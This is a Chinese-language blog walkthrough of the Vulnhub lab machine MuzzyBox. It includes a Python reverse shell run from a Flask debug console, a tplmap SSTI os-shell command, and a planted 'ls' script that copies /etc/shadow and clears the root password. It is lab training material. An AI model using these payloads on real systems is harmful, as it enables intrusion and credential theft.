---
title: 'MuzzyBox: 1: Walkthrough'
date: 2020-05-01T15:57:36+08:00
author: 2hanx
layout: post
categories:
  - Vulnhub
---
### 主机识别

`nmap -sn 192.168.1.1/24`

### 网络拓扑

| 计算机      | IP              |
| -------- | --------------- |
| Kali     | `192.168.1.107` |
| MuzzyBox | `192.168.1.105` |

### 扫描端口和版本信息

`nmap -A 192.168.1.105`

![2.png](https://i.loli.net/2020/05/01/46Q9Ax3bFDZhXHS.png) 

### 访问Web并确认web应用

访问 _80_ 端口我们看到有三个挑战，看来需要逐个通过这些挑战

### 挑战 1

![3.png](https://i.loli.net/2020/05/01/Y6NAxrsUJdujgVv.png) 

根据页面信息是需要上传一张图片来识别，刚开始认为是参考图片中存在某些信息，不过分析过后并没有什么特别。多次尝试后又根据提示是需要上传它的 _screenshot_，看来是要修改这个_idcard_

![idcard.png](https://i.loli.net/2020/05/01/vO2NztCad5UfTMu.png) 

![4.png](https://i.loli.net/2020/05/01/YlrsChJMj73gDqS.png) 

> 得到第一个重要信息：`P!N_!$_123-456-789}` 

### 挑战 2

这是一个 `_Flask_` 应用，并且打开了 **debug** 调试模式，可能可以执行系统命令[^1]

![5.png](https://i.loli.net/2020/05/01/YRNiH6SQbIvdZBW.png) 

将该代码复制到 `_console_` 执行，并在 Kali 上开启监听即可 `_getshell_`

```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.1.107",6677));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

![6.png](https://i.loli.net/2020/05/01/CniExk3mTVRt75y.png) 

> 得到第二个重要信息：`N$cTF{R34D_F!L3_/home/webssti/noflag.txt}` 

看来我们的下一个目标就是读取该文件：`/home/webssti/noflag.txt`

### 挑战 3

![7.png](https://i.loli.net/2020/05/01/6AltckXs7MmH4CG.png) 

测试发现存在 _XSS_ 漏洞，不过这里是 **SSTI** 漏洞。为了利用该漏洞，使用 **tplmap** 开源工具

```bash
git clone https://github.com/epinna/tplmap.git
cd tplmap/
ls
python2 tplmap.py -u "http://192.168.1.105:15000/page?name=muzzy" --os-shell
```

![8.png](https://i.loli.net/2020/05/01/3zXSPTI2pYcD1Rh.png) 

> 得到第三个重要信息：`ssh nsctf iamnsce` 

接下来我们就是用 _ssh_ 连接虚拟机，并且发现该目录（`/usr/local/sbin`）的用户组是 _nsctf_，也就说明该目录下的命令我们都可以执行

![9.png](https://i.loli.net/2020/05/01/mUTptl6Ez1AYueV.png) 

在该目录下新建 `ls` 文件，并且也可以删除 _root_ 用户的密码

```bash
cat /root/Final_Flag.txt > /home/nsctf/flag.txt
cat /etc/passwd > /home/nsctf/passwd.txt
cat /etc/shadow > /home/nsctf/shadow.txt
passwd -d root
```

![10.png](https://i.loli.net/2020/05/01/cZ3ej5wCyW7K4Vl.png) 

### 总结

虽然通过`uname -r`看到该Linux内核版本是：_4.15.0-88-generic_，经过 OSINT 找到该 exp[^2]，但是需要某些命令支持，并且低权限用户不具备安装软件条件

### Ref.

  * [hackingarticles](https://www.hackingarticles.in/muzzybox-1-vulnhub-walkthrough/)

---

[^1]: Flask 打开 Debug 模式直接 getshell
[^2]: [exploit-db](https://www.exploit-db.com/exploits/47166)
